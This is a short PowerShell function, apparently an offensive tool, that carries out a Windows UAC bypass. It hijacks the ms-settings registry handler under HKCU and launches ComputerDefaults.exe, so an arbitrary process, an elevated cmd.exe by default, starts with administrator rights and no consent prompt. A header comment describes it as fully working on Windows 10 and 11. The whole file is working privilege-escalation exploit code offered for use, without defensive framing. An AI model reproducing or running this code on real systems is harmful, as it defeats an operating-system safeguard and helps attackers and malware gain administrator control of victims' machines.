Function BypassUAC {

<#

https://crimsonlabs.io/posts/2022/04/this-uac-bypass-still-works/

By default, starts an elevated CMD prompt.
Tested and fully working on Windows 10 & 11.

#>

    Param (
        [Parameter(Mandatory = $False)]
        [String] $Process = "C:\windows\system32\cmd.exe",
        [String] $Arguments = ""
    )

    If ( (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544") ) {
            Remove-Item "HKCU:\software\classes\ms-settings" -Force -Recurse
    } Else {
            $RegistryKey = "HKCU:\software\classes\ms-settings\shell\open\command"
            New-Item $RegistryKey -Force
            New-ItemProperty $RegistryKey -Name "DelegateExecute" -Value $null -Force
            Set-ItemProperty $RegistryKey -Name "(default)" -Value "$Process $Arguments" -Force
            Start-Process "ComputerDefaults.exe"
    }
    
}
